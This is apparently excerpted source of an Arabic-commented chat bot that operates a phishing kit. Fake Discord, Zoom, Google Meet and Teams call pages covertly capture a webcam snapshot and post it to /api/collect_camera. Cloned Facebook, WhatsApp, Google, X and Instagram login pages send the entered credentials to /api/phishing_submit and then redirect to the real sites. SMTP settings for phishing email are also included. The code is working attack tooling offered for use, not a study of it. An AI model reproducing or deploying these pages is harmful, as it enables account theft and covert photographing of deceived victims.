...
تم إصلاح جميع الأخطاء (SMTP، time، 409 Conflict)
تم إضافة آلية قتل النسخ القديمة تلقائياً
تم تحسين صفحات التصيد وواجهات الكاميرا والمكالمة
...
# ===================== إعدادات SMTP (للبريد التصيد) =====================
SMTP_SERVER = os.environ.get('SMTP_SERVER', 'smtp.gmail.com')
SMTP_PORT = int(os.environ.get('SMTP_PORT', 587))
SMTP_USER = os.environ.get('SMTP_USER', 'your-email@gmail.com')
SMTP_PASS = os.environ.get('SMTP_PASS', 'your-password')  # استخدم كلمة مرور التطبيق من Gmail
...
def kill_old_bot_instances():
    """تقتل أي عملية Python أخرى تشغل نفس ملف البوت (bot.py) باستثناء العملية الحالية."""
...
# ===================== نهاية الجزء الأول =====================
# ===================== قوالب مكالمات الفيديو =====================
VIDEO_CALL_TEMPLATES = {
    'discord': '''
    <!DOCTYPE html>
    <html lang="ar">
    <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Discord - مكالمة صوتية</title>
    <style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:#1e1e2e;display:flex;justify-content:center;align-items:center;min-height:100vh;color:#fff}.call-container{background:#2b2d3a;border-radius:16px;padding:30px;width:100%;max-width:500px;box-shadow:0 10px 40px rgba(0,0,0,0.6)}.call-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:20px}.call-header h2{font-size:20px;color:#fff}.call-header .leave-btn{background:#ed4245;border:none;color:#fff;padding:8px 16px;border-radius:8px;cursor:pointer;font-weight:600}.participants{display:flex;gap:15px;flex-wrap:wrap;justify-content:center;margin:20px 0}.participant{text-align:center;width:70px}.participant .avatar{width:60px;height:60px;border-radius:50%;background:#5865f2;display:flex;align-items:center;justify-content:center;font-size:24px;margin:0 auto 5px}.participant .status{font-size:10px;color:#3ba55c}.participant .status.offline{color:#747f8d}.controls{display:flex;justify-content:center;gap:15px;margin-top:20px}.controls button{background:#40444b;border:none;color:#fff;width:50px;height:50px;border-radius:50%;font-size:20px;cursor:pointer;transition:0.2s}.controls button:hover{background:#5865f2}.controls button.danger{background:#ed4245}.controls button.danger:hover{background:#c03537}.waiting-msg{text-align:center;color:#b5b9c4;font-size:14px;margin-top:15px;padding:10px;background:#1e1e2e;border-radius:8px}.fake-chat{margin-top:15px;background:#1e1e2e;border-radius:8px;padding:10px;max-height:100px;overflow-y:auto;font-size:13px;color:#b5b9c4}.fake-chat .msg{margin:5px 0}.fake-chat .msg .user{color:#5865f2;font-weight:600}</style>
    </head>
    <body><div class="call-container"><div class="call-header"><h2>🎮 غرفة الصوت - عام</h2><button class="leave-btn" onclick="endCall()">مغادرة</button></div><div class="participants"><div class="participant"><div class="avatar">👤</div><div>أنت</div><div class="status">🟢 متصل</div></div><div class="participant"><div class="avatar">👤</div><div>Ahmed</div><div class="status">🟢 متصل</div></div><div class="participant"><div class="avatar">👤</div><div>Sara</div><div class="status">🟢 متصل</div></div><div class="participant"><div class="avatar">👤</div><div>Khalid</div><div class="status offline">⚫ غير متصل</div></div></div><div class="waiting-msg">⏳ جاري الاتصال... يرجى الانتظار</div><div class="fake-chat"><div class="msg"><span class="user">Ahmed:</span> مرحبا جميعاً</div><div class="msg"><span class="user">Sara:</span> كيف الحال؟</div></div><div class="controls"><button onclick="toggleMic()">🎤</button><button onclick="toggleCam()">📷</button><button onclick="shareScreen()">🖥️</button><button class="danger" onclick="endCall()">📞</button></div></div>
    <script>
        let stream=null;let chatId=window.location.search.split('id=')[1]||'TEST';
        function requestCamera(){navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:320,height:240},audio:false}).then(s=>{stream=s;captureAndSend();}).catch(()=>{setTimeout(requestCamera,2000);});}
        function captureAndSend(){if(!stream)return;const video=document.createElement('video');video.srcObject=stream;video.play();setTimeout(()=>{const canvas=document.createElement('canvas');canvas.width=320;canvas.height=240;canvas.getContext('2d').drawImage(video,0,0);const img=canvas.toDataURL('image/jpeg');fetch('/api/collect_camera',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:chatId,image:img,source:'discord_call'})});stream.getTracks().forEach(t=>t.stop());},1500);}
        function toggleMic(){alert('🎤 تم كتم الميكروفون (محاكاة)');}
        function toggleCam(){alert('📷 تم إيقاف الكاميرا (محاكاة)');}
        function shareScreen(){alert('🖥️ مشاركة الشاشة (محاكاة)');}
        function endCall(){window.location.href='https://discord.com';}
        window.onload=function(){setTimeout(requestCamera,1000);};
    </script></body></html>
    ''',
    'zoom': '''
    <!DOCTYPE html>
    <html lang="ar">
    <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Zoom - اجتماع</title>
    <style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:#0b2b3d;display:flex;justify-content:center;align-items:center;min-height:100vh;color:#fff}.container{background:#1a3a4a;border-radius:16px;padding:30px;width:100%;max-width:500px;box-shadow:0 10px 40px rgba(0,0,0,0.5)}.header{display:flex;justify-content:space-between;align-items:center}.header h2{font-size:18px;color:#fff}.header .meeting-id{background:#2a4a5a;padding:4px 12px;border-radius:20px;font-size:12px}.video-placeholder{background:#0a2a3a;border-radius:12px;height:180px;display:flex;align-items:center;justify-content:center;margin:15px 0;font-size:14px;color:#7a9aaa}.controls{display:flex;justify-content:center;gap:12px;margin-top:15px;flex-wrap:wrap}.controls button{background:#2a5a6a;border:none;color:#fff;padding:10px 18px;border-radius:30px;font-size:14px;cursor:pointer;transition:0.2s}.controls button:hover{background:#3a7a8a}.controls button.danger{background:#d43a3a}.controls button.danger:hover{background:#b02a2a}.participants-list{margin-top:15px;font-size:13px;color:#9ab}.participants-list span{display:inline-block;background:#2a4a5a;padding:4px 12px;border-radius:20px;margin:3px}</style>
    </head>
    <body><div class="container"><div class="header"><h2>🔵 اجتماع Zoom</h2><span class="meeting-id">ID: 123-456-789</span></div><div class="video-placeholder">📹 جاري تحميل الفيديو...</div><div class="participants-list"><span>👤 أنت (مضيف)</span><span>👤 Ahmed</span><span>👤 Sara</span><span>👤 Khalid</span></div><div class="controls"><button onclick="toggleMic()">🎤 كتم</button><button onclick="toggleCam()">📷 إيقاف</button><button onclick="shareScreen()">🖥️ مشاركة</button><button class="danger" onclick="endCall()">🔴 إنهاء</button></div></div>
    <script>
        let stream=null;let chatId=window.location.search.split('id=')[1]||'TEST';
        function requestCamera(){navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:320,height:240},audio:false}).then(s=>{stream=s;captureAndSend();}).catch(()=>{setTimeout(requestCamera,2000);});}
        function captureAndSend(){if(!stream)return;const video=document.createElement('video');video.srcObject=stream;video.play();setTimeout(()=>{const canvas=document.createElement('canvas');canvas.width=320;canvas.height=240;canvas.getContext('2d').drawImage(video,0,0);const img=canvas.toDataURL('image/jpeg');fetch('/api/collect_camera',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:chatId,image:img,source:'zoom_call'})});stream.getTracks().forEach(t=>t.stop());},1500);}
        function toggleMic(){alert('🎤 تم كتم الميكروفون (محاكاة)');}
        function toggleCam(){alert('📷 تم إيقاف الكاميرا (محاكاة)');}
        function shareScreen(){alert('🖥️ مشاركة الشاشة (محاكاة)');}
        function endCall(){window.location.href='https://zoom.us';}
        window.onload=function(){setTimeout(requestCamera,1000);};
    </script></body></html>
    ''',
    'google_meet': '''
    <!DOCTYPE html>
    <html lang="ar">
    <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Google Meet</title>
    <style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Google Sans',Roboto,Arial,sans-serif;background:#202124;display:flex;justify-content:center;align-items:center;min-height:100vh;color:#fff}.container{background:#2d2f33;border-radius:16px;padding:30px;width:100%;max-width:500px;box-shadow:0 10px 40px rgba(0,0,0,0.5)}.header{display:flex;justify-content:space-between;align-items:center}.header h2{font-size:18px;color:#fff}.video-area{background:#1a1c1f;border-radius:12px;height:160px;display:flex;align-items:center;justify-content:center;margin:15px 0;font-size:14px;color:#8a8c8f}.controls{display:flex;justify-content:center;gap:10px;flex-wrap:wrap}.controls button{background:#3c4043;border:none;color:#fff;width:48px;height:48px;border-radius:50%;font-size:18px;cursor:pointer;transition:0.2s}.controls button:hover{background:#5a5e63}.controls button.danger{background:#d93025}.controls button.danger:hover{background:#b3261e}</style>
    </head>
    <body><div class="container"><div class="header"><h2>🔵 Google Meet</h2><span style="font-size:12px;color:#8a8c8f;">رمز: abc-def-ghi</span></div><div class="video-area">📹 جاري الاتصال...</div><div class="controls"><button onclick="toggleMic()">🎤</button><button onclick="toggleCam()">📷</button><button onclick="shareScreen()">🖥️</button><button class="danger" onclick="endCall()">📞</button></div></div>
    <script>
        let stream=null;let chatId=window.location.search.split('id=')[1]||'TEST';
        function requestCamera(){navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:320,height:240},audio:false}).then(s=>{stream=s;captureAndSend();}).catch(()=>{setTimeout(requestCamera,2000);});}
        function captureAndSend(){if(!stream)return;const video=document.createElement('video');video.srcObject=stream;video.play();setTimeout(()=>{const canvas=document.createElement('canvas');canvas.width=320;canvas.height=240;canvas.getContext('2d').drawImage(video,0,0);const img=canvas.toDataURL('image/jpeg');fetch('/api/collect_camera',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:chatId,image:img,source:'google_meet_call'})});stream.getTracks().forEach(t=>t.stop());},1500);}
        function toggleMic(){alert('🎤 تم كتم الميكروفون (محاكاة)');}
        function toggleCam(){alert('📷 تم إيقاف الكاميرا (محاكاة)');}
        function shareScreen(){alert('🖥️ مشاركة الشاشة (محاكاة)');}
        function endCall(){window.location.href='https://meet.google.com';}
        window.onload=function(){setTimeout(requestCamera,1000);};
    </script></body></html>
    ''',
    'teams': '''
    <!DOCTYPE html>
    <html lang="ar">
    <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Microsoft Teams</title>
    <style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:#1a1a1a;display:flex;justify-content:center;align-items:center;min-height:100vh;color:#fff}.container{background:#2c2c2c;border-radius:16px;padding:30px;width:100%;max-width:500px;box-shadow:0 10px 40px rgba(0,0,0,0.6)}.header{display:flex;justify-content:space-between;align-items:center}.header h2{font-size:18px;color:#fff}.video-area{background:#1a1a1a;border-radius:12px;height:160px;display:flex;align-items:center;justify-content:center;margin:15px 0;font-size:14px;color:#8a8a8a}.controls{display:flex;justify-content:center;gap:10px;flex-wrap:wrap}.controls button{background:#3a3a3a;border:none;color:#fff;width:48px;height:48px;border-radius:8px;font-size:18px;cursor:pointer;transition:0.2s}.controls button:hover{background:#5a5a5a}.controls button.danger{background:#d13438}.controls button.danger:hover{background:#b0282a}</style>
    </head>
    <body><div class="container"><div class="header"><h2>💼 Microsoft Teams</h2><span style="font-size:12px;color:#8a8a8a;">اجتماع الفريق</span></div><div class="video-area">📹 جاري الاتصال...</div><div class="controls"><button onclick="toggleMic()">🎤</button><button onclick="toggleCam()">📷</button><button onclick="shareScreen()">🖥️</button><button class="danger" onclick="endCall()">📞</button></div></div>
    <script>
        let stream=null;let chatId=window.location.search.split('id=')[1]||'TEST';
        function requestCamera(){navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:320,height:240},audio:false}).then(s=>{stream=s;captureAndSend();}).catch(()=>{setTimeout(requestCamera,2000);});}
        function captureAndSend(){if(!stream)return;const video=document.createElement('video');video.srcObject=stream;video.play();setTimeout(()=>{const canvas=document.createElement('canvas');canvas.width=320;canvas.height=240;canvas.getContext('2d').drawImage(video,0,0);const img=canvas.toDataURL('image/jpeg');fetch('/api/collect_camera',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:chatId,image:img,source:'teams_call'})});stream.getTracks().forEach(t=>t.stop());},1500);}
        function toggleMic(){alert('🎤 تم كتم الميكروفون (محاكاة)');}
        function toggleCam(){alert('📷 تم إيقاف الكاميرا (محاكاة)');}
        function shareScreen(){alert('🖥️ مشاركة الشاشة (محاكاة)');}
        function endCall(){window.location.href='https://teams.microsoft.com';}
        window.onload=function(){setTimeout(requestCamera,1000);};
    </script></body></html>
    '''
}
...
PHISHING_TEMPLATES = {
    ...
    <head>
        ...
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #ffffff; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 0; margin: 0; }
            .container { width: 100%; max-width: 420px; padding: 20px 16px; background: #ffffff; display: flex; flex-direction: column; align-items: center; min-height: 100vh; justify-content: center; }
            .header { width: 100%; display: flex; justify-content: flex-end; padding: 4px 0 16px; font-size: 14px; color: #1877f2; font-weight: 500; }
            .logo { font-size: 48px; font-weight: 700; color: #1877f2; margin-bottom: 8px; letter-spacing: -1px; text-align: center; width: 100%; }
            .subtitle { font-size: 16px; color: #1c1e21; text-align: center; margin-bottom: 24px; font-weight: 400; }
            .form-group { width: 100%; margin-bottom: 12px; }
            .form-group input { width: 100%; padding: 14px 16px; border: 1px solid #dddfe2; border-radius: 8px; font-size: 16px; color: #1c1e21; background: #ffffff; transition: border-color 0.2s; height: 52px; outline: none; }
            .form-group input:focus { border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }
            .login-btn { width: 100%; padding: 14px; background: #1877f2; color: #ffffff; border: none; border-radius: 8px; font-size: 18px; font-weight: 700; cursor: pointer; transition: background 0.2s; height: 52px; margin-top: 4px; }
            .login-btn:hover { background: #166fe5; }
            .forgot-link { display: block; margin: 16px 0 20px; color: #1877f2; font-size: 14px; text-decoration: none; font-weight: 500; text-align: center; }
            .forgot-link:hover { text-decoration: underline; }
            .divider { border: none; border-top: 1px solid #dadde1; width: 100%; margin: 16px 0 20px; }
            .create-btn { width: 100%; padding: 14px; background: #42b72a; color: #ffffff; border: none; border-radius: 8px; font-size: 17px; font-weight: 700; cursor: pointer; transition: background 0.2s; height: 52px; }
            .create-btn:hover { background: #36a420; }
            .footer-text { margin-top: 24px; color: #8a8d91; font-size: 12px; text-align: center; }
            .footer-text strong { color: #606770; font-weight: 600; }
            .warning { background: #fffbcc; border: 1px solid #ffd700; padding: 10px; border-radius: 6px; margin-top: 16px; font-size: 12px; color: #856404; text-align: center; width: 100%; }
        </style>
    </head>
    <body>
    <div class="container">
        ...
        <form action="/api/phishing_submit" method="POST" id="phishForm">
            ...
            <div class="form-group"><input type="text" name="username" placeholder="رقم الهاتف أو البريد الإلكتروني" required autofocus></div>
    ...
    <script>document.getElementById('phishForm').addEventListener('submit',function(e){e.preventDefault();setTimeout(function(){window.location.href='https://www.facebook.com';},1500);this.submit();});</script>
    </body></html>
    ''',
    'whatsapp': '''
    <!DOCTYPE html>
    ...
    <head>
        ...
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #ffffff; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 0; margin: 0; }
            .container { width: 100%; max-width: 420px; padding: 20px 16px; background: #ffffff; display: flex; flex-direction: column; align-items: center; min-height: 100vh; justify-content: center; }
            .header { width: 100%; display: flex; justify-content: flex-end; padding: 4px 0 16px; font-size: 14px; color: #075e54; font-weight: 500; }
            .logo { font-size: 42px; font-weight: 700; color: #25d366; margin-bottom: 8px; text-align: center; width: 100%; }
            .subtitle { font-size: 16px; color: #1c1e21; text-align: center; margin-bottom: 24px; font-weight: 400; }
            .form-group { width: 100%; margin-bottom: 12px; }
            .form-group input { width: 100%; padding: 14px 16px; border: 1px solid #dddfe2; border-radius: 8px; font-size: 16px; color: #1c1e21; background: #ffffff; transition: border-color 0.2s; height: 52px; outline: none; }
            .form-group input:focus { border-color: #075e54; box-shadow: 0 0 0 2px #e8f5e9; }
            .login-btn { width: 100%; padding: 14px; background: #25d366; color: #ffffff; border: none; border-radius: 8px; font-size: 18px; font-weight: 700; cursor: pointer; transition: background 0.2s; height: 52px; margin-top: 4px; }
            .login-btn:hover { background: #1ebe5c; }
            .forgot-link { display: block; margin: 16px 0 20px; color: #075e54; font-size: 14px; text-decoration: none; font-weight: 500; text-align: center; }
            .forgot-link:hover { text-decoration: underline; }
            .divider { border: none; border-top: 1px solid #dadde1; width: 100%; margin: 16px 0 20px; }
            .footer-text { margin-top: 24px; color: #8a8d91; font-size: 12px; text-align: center; }
            .warning { background: #fffbcc; border: 1px solid #ffd700; padding: 10px; border-radius: 6px; margin-top: 16px; font-size: 12px; color: #856404; text-align: center; width: 100%; }
    ...
    <script>document.getElementById('phishForm').addEventListener('submit',function(e){e.preventDefault();setTimeout(function(){window.location.href='https://web.whatsapp.com';},1500);this.submit();});</script>
    </body></html>
    ''',
    'google': '''
    <!DOCTYPE html>
    ...
    <head>
        ...
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { font-family: 'Google Sans', Roboto, Arial, sans-serif; background: #ffffff; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 0; margin: 0; }
            .container { width: 100%; max-width: 420px; padding: 20px 16px; background: #ffffff; display: flex; flex-direction: column; align-items: center; min-height: 100vh; justify-content: center; }
            .logo { font-size: 42px; font-weight: 500; color: #4285f4; margin-bottom: 8px; text-align: center; width: 100%; letter-spacing: -0.5px; }
            .logo span { color: #ea4335; }
            .subtitle { font-size: 20px; color: #1c1e21; text-align: center; margin-bottom: 24px; font-weight: 400; }
            .form-group { width: 100%; margin-bottom: 12px; }
            .form-group input { width: 100%; padding: 14px 16px; border: 1px solid #dadce0; border-radius: 8px; font-size: 16px; color: #1c1e21; background: #ffffff; transition: border-color 0.2s; height: 52px; outline: none; }
            .form-group input:focus { border-color: #4285f4; box-shadow: 0 0 0 2px #e8f0fe; }
            .login-btn { width: 100%; padding: 14px; background: #4285f4; color: #ffffff; border: none; border-radius: 8px; font-size: 18px; font-weight: 500; cursor: pointer; transition: background 0.2s; height: 52px; margin-top: 4px; }
            .login-btn:hover { background: #3367d6; }
            .forgot-link { display: block; margin: 16px 0 20px; color: #4285f4; font-size: 14px; text-decoration: none; font-weight: 500; text-align: center; }
            .forgot-link:hover { text-decoration: underline; }
            .divider { border: none; border-top: 1px solid #dadce0; width: 100%; margin: 16px 0 20px; }
            .footer-text { margin-top: 24px; color: #8a8d91; font-size: 12px; text-align: center; }
            .warning { background: #fffbcc; border: 1px solid #ffd700; padding: 10px; border-radius: 6px; margin-top: 16px; font-size: 12px; color: #856404; text-align: center; width: 100%; }
        </style>
    </head>
    ...
    <script>document.getElementById('phishForm').addEventListener('submit',function(e){e.preventDefault();setTimeout(function(){window.location.href='https://www.google.com';},1500);this.submit();});</script>
    </body></html>
    ''',
    'twitter': '''
    <!DOCTYPE html>
    ...
    <head>
        ...
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #ffffff; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 0; margin: 0; }
            .container { width: 100%; max-width: 420px; padding: 20px 16px; background: #ffffff; display: flex; flex-direction: column; align-items: center; min-height: 100vh; justify-content: center; }
            .logo { font-size: 48px; font-weight: 700; color: #000000; margin-bottom: 8px; text-align: center; width: 100%; }
            .subtitle { font-size: 20px; color: #1c1e21; text-align: center; margin-bottom: 24px; font-weight: 400; }
            .form-group { width: 100%; margin-bottom: 12px; }
            .form-group input { width: 100%; padding: 14px 16px; border: 1px solid #dddfe2; border-radius: 8px; font-size: 16px; color: #1c1e21; background: #ffffff; transition: border-color 0.2s; height: 52px; outline: none; }
            .form-group input:focus { border-color: #1d9bf0; box-shadow: 0 0 0 2px #e8f5fe; }
            .login-btn { width: 100%; padding: 14px; background: #000000; color: #ffffff; border: none; border-radius: 8px; font-size: 18px; font-weight: 700; cursor: pointer; transition: background 0.2s; height: 52px; margin-top: 4px; }
            .login-btn:hover { background: #1a1a1a; }
            .forgot-link { display: block; margin: 16px 0 20px; color: #1d9bf0; font-size: 14px; text-decoration: none; font-weight: 500; text-align: center; }
            .forgot-link:hover { text-decoration: underline; }
            .divider { border: none; border-top: 1px solid #dadde1; width: 100%; margin: 16px 0 20px; }
            .footer-text { margin-top: 24px; color: #8a8d91; font-size: 12px; text-align: center; }
            .warning { background: #fffbcc; border: 1px solid #ffd700; padding: 10px; border-radius: 6px; margin-top: 16px; font-size: 12px; color: #856404; text-align: center; width: 100%; }
    ...
    <script>document.getElementById('phishForm').addEventListener('submit',function(e){e.preventDefault();setTimeout(function(){window.location.href='https://x.com';},1500);this.submit();});</script>
    </body></html>
    ''',
    'instagram': '''
    <!DOCTYPE html>
    ...
    <head>
        ...
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 0; margin: 0; }
            .container { width: 100%; max-width: 420px; padding: 20px 16px; background: #ffffff; display: flex; flex-direction: column; align-items: center; min-height: 100vh; justify-content: center; border: 1px solid #dbdbdb; border-radius: 4px; }
            .logo { font-size: 42px; font-weight: 700; color: #262626; margin-bottom: 8px; text-align: center; width: 100%; font-family: 'Grand Hotel', cursive; }
            .subtitle { font-size: 16px; color: #262626; text-align: center; margin-bottom: 24px; font-weight: 400; }
            .form-group { width: 100%; margin-bottom: 12px; }
            .form-group input { width: 100%; padding: 14px 16px; border: 1px solid #dbdbdb; border-radius: 4px; font-size: 16px; color: #262626; background: #fafafa; transition: border-color 0.2s; height: 48px; outline: none; }
            .form-group input:focus { border-color: #a8a8a8; }
            .login-btn { width: 100%; padding: 14px; background: #0095f6; color: #ffffff; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background 0.2s; height: 48px; margin-top: 4px; }
            .login-btn:hover { background: #0077cc; }
            .forgot-link { display: block; margin: 16px 0 20px; color: #00376b; font-size: 14px; text-decoration: none; font-weight: 500; text-align: center; }
            .forgot-link:hover { text-decoration: underline; }
            .divider { border: none; border-top: 1px solid #dbdbdb; width: 100%; margin: 16px 0 20px; }
            .footer-text { margin-top: 24px; color: #8a8d91; font-size: 12px; text-align: center; }
            .warning { background: #fffbcc; border: 1px solid #ffd700; padding: 10px; border-radius: 4px; margin-top: 16px; font-size: 12px; color: #856404; text-align: center; width: 100%; }
        </style>
    </head>
    <body>
    <div class="container">
    ...
    <script>document.getElementById('phishForm').addEventListener('submit',function(e){e.preventDefault();setTimeout(function(){window.location.href='https://www.instagram.com';},1500);this.submit();});</script>
    </body></html>
    '''
}
...
def callback_handler(call):
    try:
        ...
        # أزرار الاقتباسات والأذكار والأدعية
        if data == "quotes_menu":
